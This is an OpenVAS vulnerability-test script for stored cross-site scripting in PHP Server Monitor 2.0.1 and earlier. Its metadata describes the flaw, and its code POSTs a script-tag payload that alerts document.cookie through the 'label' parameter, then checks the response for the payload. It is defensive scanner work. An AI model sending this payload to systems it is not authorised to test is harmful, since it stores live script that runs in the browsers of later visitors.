###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_server_monitor_mult_stored_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# PHP Server Monitor Multiple Stored Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow the attacker to execute arbitrary code in
  the context of an application.
  Impact Level: Application";
tag_affected = "PHP Server Monitor version 2.0.1 and prior";
tag_insight = "The flaws are due improper validation of user-supplied input passed via the
  'label' and 'name' parameter to 'index.php', that allows attackers to execute
  arbitrary HTML and script code on the web server.";
tag_solution = "No solution or patch is available as of 22nd November, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/phpservermon/";
tag_summary = "This host is installed with PHP Server Monitor and is prone to
  multiple stored cross-site scripting vulnerabilities.";

if(description)
{
  script_id(803109);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-22 12:51:18 +0530 (Thu, 22 Nov 2012)");
  script_name("PHP Server Monitor Multiple Stored Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22881/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118254/PHP-Server-Monitor-Cross-Site-Scripting.html");

  script_description(desc);
  script_summary("Check if PHP Server Monitor is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
req = "";
res = "";
dir = "";

## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("/phpservermon", "", cgi_dirs()))
{
  ## Confirm the application
  if(http_vuln_check(port:port, url: dir + "/index.php",
     pattern:">PHP Server Monitor<", check_header:TRUE,
     extra_check:'>SERVER MONITOR<'))
  {
    ## Construct attack request
    req = http_post(port:port, item:string(dir,"/index.php?type=servers"),
          data:"label=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2F" +
               "script%3E&ip=&port=&type=service&active=yes&email=yes" +
               "&sms=yes&server_id=0&submit=Save");
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    ## Confirm exploit worked by checking the response
    if(res && '<script>alert(document.cookie);</script>' >< res &&
       '>Add new?<' >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
